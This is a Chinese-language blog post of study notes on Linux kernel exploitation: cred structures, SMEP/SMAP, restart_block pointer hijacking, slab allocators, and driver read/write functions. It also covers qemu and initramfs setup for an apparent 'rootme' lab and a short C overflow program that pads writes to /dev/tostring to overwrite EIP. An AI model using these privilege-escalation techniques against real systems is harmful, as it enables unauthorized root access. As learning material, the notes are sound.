<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>winter - 像初雪一样自由洒落</title>
  <meta name="author" content="winter">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="winter - 像初雪一样自由洒落"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-70812759-1', 'auto');
  ga('send', 'pageview');
</script>



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<meta name="generator" content="Hexo 4.2.1"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">winter - 像初雪一样自由洒落</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>winter - 像初雪一样自由洒落<span class="blink-fast">∎</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		Keep and carry on.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/06/05/kernel-study/" >kernel study</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-06-05  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
<p>这里只是简单记录了一些笔者认为的重点。</p>
</blockquote>
<h3 id="概念性"><a href="#概念性" class="headerlink" title="概念性"></a>概念性</h3><ol>
<li><p>cred =&gt; 进程权限结构体</p>
</li>
<li><p>smep =&gt; 执行</p>
</li>
<li><p>smap =&gt; 访问</p>
</li>
<li><p>MMAP_MIN_ADDR =&gt; 允许mmap映射的最低内存地址</p>
</li>
<li><p>LKMs</p>
<ol>
<li>相当于内核的可执行程序</li>
<li>不能单独运行，在运行时被链接到内核</li>
</ol>
</li>
<li><p>lsmod: 列出已经加载的模块</p>
</li>
<li><p>module_init/module_exit：在载入/卸载这个驱动时<strong>自动运行</strong></p>
</li>
<li><p>C99 </p>
<ol>
<li>C编程语言标准的过去版本。 它扩展了以前的版本（ C90 ）</li>
</ol>
</li>
<li><p>允许使用可变长度数组</p>
</li>
<li><p>内核扩展模块 (modules)</p>
</li>
<li><p>bzImage: 压缩的kernel内存映像</p>
</li>
<li><p>vmlinux：未压缩的kernel内存映像</p>
</li>
<li><p>rootfs.cpio: 文件系统映像</p>
</li>
<li><p>alloc_chrdev_region：动态分配设备编号</p>
</li>
</ol>
<hr>
<h3 id="IRET"><a href="#IRET" class="headerlink" title="IRET"></a>IRET</h3><p><strong>1. 相同保护级别</strong></p>
<p>从堆栈弹出</p>
<ol>
<li>代码段选择子 =&gt; CS寄存器</li>
<li>指令指针 =&gt; IP寄存器</li>
<li>标志寄存器 =&gt; EFLAGS寄存器</li>
</ol>
<p><strong>不同的保护级别</strong></p>
<ol start="4">
<li>堆栈段选择子 =&gt; SS寄存器</li>
<li>堆栈指针 =&gt; SP寄存器</li>
</ol>
<p>返回到用户模式</p>
<blockquote>
<p>栈上保存了<code>trap frame</code>，用于恢复信息</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>* eip;                <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> cs;              <span class="comment">// code segment    +4</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;          <span class="comment">// CPU flags       +8</span></span><br><span class="line">    <span class="keyword">void</span>* esp;                <span class="comment">// stack pointer       +12</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ss;              <span class="comment">// stack segment   +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="thread-info"><a href="#thread-info" class="headerlink" title="thread_info"></a>thread_info</h3><p>内核堆栈与thread_info结构共享4k / 8k的总大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> thread_union &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/2020-03-15-061423.png" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
<h4 id="restart-block"><a href="#restart-block" class="headerlink" title="restart_block"></a>restart_block</h4><ol>
<li>thread_info中的一个成员</li>
<li>是每个线程的结构</li>
<li>跟踪信息和参数 =&gt; 重新启动系统调用</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(struct restart_block *);</span><br></pre></td></tr></table></figure>

<p>有一个fn的函数指针，控制指针，劫持EIP</p>
<h5 id="调用fn"><a href="#调用fn" class="headerlink" title="调用fn"></a>调用fn</h5><p>用户态调用fn</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> *<span class="title">restart</span> = &amp;<span class="title">current_thread_info</span>()-&gt;<span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">return</span> restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall(SYS_restart_syscall);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,<span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>返回值：成功返回创建的映射区的首地址；失败返回<strong>宏MAP_FAILED。</strong></p>
</li>
<li><p>参数： </p>
<p>addr:    指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p>
<p>length： 欲创建映射区的大小。</p>
<p>prot：   映射区权限PROT_READ、PROT_WRITE、PROT_READ|PROT_WRITE。</p>
<p>flags：   标志位参数(常用于设定更新物理区域、设置共享、创建匿名映射区)；</p>
<p>MAP_SHARED: 会将映射区所做的操作反映到物理设备（磁盘）上。</p>
<p>MAP_PRIVATE: 映射区所做的修改不会反映到物理设备。</p>
<p>fd：     用来建立映射区的文件描述符。</p>
<p>offset： 映射文件的偏移(4k的整数倍)。</p>
</li>
</ol>
<h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h3><blockquote>
<p>从源<strong>source</strong>所指的内存地址的起始位置开始拷贝n个字节到目标<strong>destin</strong>所指的内存地址的起始位置中。</p>
</blockquote>
<h4 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> destin, <span class="keyword">void</span> source, <span class="keyword">unsigned</span> n)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li>destin– 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。</li>
<li>source– 指向要复制的数据源，类型强制转换为 void* 指针。</li>
<li>n– 要被复制的字节数。</li>
</ul>
<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>该函数返回一个指向目标存储区<strong>destin</strong>的指针。</p>
<h3 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h3><table>
<thead>
<tr>
<th>kptr_restrict</th>
<th>权限描述</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>内核将符号地址打印为全0, root和普通用户都没有权限</td>
</tr>
<tr>
<td>1</td>
<td>root用户有权限读取, 普通用户没有权限</td>
</tr>
<tr>
<td>0</td>
<td>root和普通用户都可以读取</td>
</tr>
</tbody></table>
<h3 id="tty"><a href="#tty" class="headerlink" title="tty"></a>tty</h3><p><a href="https://blog.csdn.net/zhoucheng05_13/article/details/86510469" target="_blank" rel="noopener">https://blog.csdn.net/zhoucheng05_13/article/details/86510469</a></p>
<ol>
<li>虚拟控制台</li>
<li>串口</li>
<li>伪终端设备</li>
</ol>
<h3 id="ptmx"><a href="#ptmx" class="headerlink" title="ptmx"></a>ptmx</h3><p>伪终端的master端</p>
<h3 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a>kmalloc</h3><p>使用<code>slab/slub</code>分配器，使用多级的结构进行管理</p>
<p>首先有<code>cache</code>层</p>
<h4 id="cache结构"><a href="#cache结构" class="headerlink" title="cache结构"></a><code>cache</code>结构</h4><ol>
<li>空对象</li>
<li>部分使用的对象</li>
<li>完全使用中的对象</li>
</ol>
<p>对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。</p>
<h3 id="slab-slub分配器"><a href="#slab-slub分配器" class="headerlink" title="slab/slub分配器"></a><code>slab/slub</code>分配器</h3><ul>
<li><p><code>slab</code>分配器严格按照<code>cache</code>去区分，不同<code>cache</code>的无法分配在一页内</p>
</li>
<li><p><code>slub</code>分配器则较为宽松，不同<code>cache</code>如果分配相同大小，可能会在一页内。</p>
</li>
</ul>
<h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><p>mount是Linux下的一个命令，它可以将分区挂接到Linux的一个文件夹下，从而将分区和该目录联系起来，因此我们只要访问这个文件夹，就相当于访问该分区了。</p>
<h3 id="file-operations"><a href="#file-operations" class="headerlink" title="file_operations"></a>file_operations</h3><p>属于Linux 字符设备驱动结构</p>
<ol>
<li>Linux使用file_operations结构访问驱动程序的函数，这个结构的每一个成员的名字都对应着一个调用。</li>
<li>用户进程利用在对设备文件进行诸如read/write操作的时候，系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。</li>
</ol>
<h4 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h4><blockquote>
<p>这个函数用来从<strong>设备</strong>中<strong>获取数据</strong>。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> (*<span class="built_in">read</span>) (struct file * filp, <span class="keyword">char</span> __user * <span class="built_in">buffer</span>, <span class="keyword">size_t</span>    <span class="built_in">size</span> , <span class="keyword">loff_t</span> * p);</span><br></pre></td></tr></table></figure>

<ul>
<li>指针参数 filp 为进行读取信息的目标文件</li>
<li>指针参数buffer 为对应放置信息的缓冲区（即用户空间内存地址）</li>
<li>参数size为要读取的信息长度</li>
<li>参数 p 为读的位置相对于文件开头的偏移，在读取信息后，这个指针一般都会移动，移动的值为要读取信息的长度值</li>
</ul>
<h4 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h4><blockquote>
<p> 发送数据给设备</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> (*<span class="built_in">write</span>) (struct file * filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *   <span class="built_in">buffer</span>, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> * ppos);</span><br></pre></td></tr></table></figure>

<ul>
<li>参数filp为目标文件结构体指针</li>
<li>buffer为要写入文件的信息缓冲区</li>
<li>count为要写入信息的长度</li>
<li>ppos为当前的偏移位置，这个值通常是用来判断写文件是否越界</li>
</ul>
<h3 id="内核态函数调用"><a href="#内核态函数调用" class="headerlink" title="内核态函数调用"></a>内核态函数调用</h3><p>memcpy() =&gt; copy_from_user()/copy_to_user()</p>
<blockquote>
<p>都是将rsi的数据拷贝到rdi</p>
</blockquote>
<ul>
<li><p>copy_from_user()</p>
<ul>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></figure>

<p>@to     将数据拷贝到内核的地址</p>
<p>@from  需要拷贝数据的地址</p>
</li>
<li><p>从用户空间拷贝数据到内核空间</p>
</li>
<li><p>返回值</p>
<ul>
<li>失败返回没有被拷贝的字节数</li>
<li>成功返回0</li>
</ul>
</li>
</ul>
</li>
<li><p>copy_to_user()</p>
</li>
</ul>
<h3 id="cred-结构体"><a href="#cred-结构体" class="headerlink" title="cred 结构体"></a>cred 结构体</h3><p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred" target="_blank" rel="noopener">源码</a></p>
<ul>
<li>内核使用<code>cred</code>结构体记录进程的权限(<code>uid，gid</code>等）</li>
<li>每个进程中都有一个 cred 结构</li>
<li>如果能修改某个进程的<code>cred</code>，那么也就修改了这个进程的权限。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *	task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *	upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task's actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>将运行着的程序分成2个（几乎）完全一样的进程，每个进程都启动一个从代码的同一位置开始执行的线程。</p>
<p>返回值：</p>
<ul>
<li>负值：创建子进程失败。</li>
<li>零：返回到新创建的子进程。</li>
<li>正值：返回父进程或调用者。该值包含新创建的子进程的进程ID 。</li>
</ul>
<h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><blockquote>
<p>可以创建一个<code>start.sh</code>文件，拷贝下面的内容，其中需要修改path路径为存放文件的路径。</p>
<p>也可以直接在命令行执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -kernel bzImage -s -append nokaslr -initrd initramfs.img -fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;linkern  -device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-append nokaslr \</span><br><span class="line">-initrd initramfs.img \</span><br><span class="line">-fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;nullpoint&#x2F; \</span><br><span class="line">-device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme</span><br></pre></td></tr></table></figure>



<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><blockquote>
<p>调试方法</p>
</blockquote>
<p>调试x64内核=&gt;设置架构=&gt;set architecture i386:x86-64:intel</p>
<h4 id="第一部分：c文件"><a href="#第一部分：c文件" class="headerlink" title="第一部分：c文件"></a>第一部分：c文件</h4><ol>
<li><p>编写一个c程序，如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Padding[<span class="number">9</span>] = <span class="string">"AAAAAAAA"</span>;</span><br><span class="line">    <span class="keyword">char</span> Eip[<span class="number">5</span>] ;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x40</span>; i++)</span><br><span class="line">        <span class="built_in">write</span>(fd,Padding,<span class="keyword">sizeof</span>(Padding));</span><br><span class="line">    <span class="built_in">write</span>(fd,Eip,<span class="keyword">sizeof</span>(Eip));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译为静态文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -m32 -static -o <span class="built_in">test</span> test.cpp</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压文件系统</p>
<blockquote>
<p><a href="https://www.cnblogs.com/carriezhangyan/p/9407567.html" target="_blank" rel="noopener">https://www.cnblogs.com/carriezhangyan/p/9407567.html</a></p>
<p>可以将下面的放在一个first.sh脚本中执行</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">mv initramfs.img initramfs.img.gz</span><br><span class="line">gunzip initramfs.img.gz</span><br><span class="line">mkdir initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.img</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531143052634.png" alt="image-20210531143052634"></p>
</li>
<li><p>将编译好的文件放入文件夹</p>
<p><img src="/2021/06/05/kernel-study/image-20210531143128795.png" alt="image-20210531143128795"></p>
</li>
<li><p>打包文件系统</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行start.sh，此时qemu里面可以看到test文件</p>
<p><img src="/2021/06/05/kernel-study/image-20210531143323513.png" alt="image-20210531143323513"></p>
</li>
</ol>
<blockquote>
<p>以上步骤整合成一个自动打包c文件并启动的脚本</p>
</blockquote>
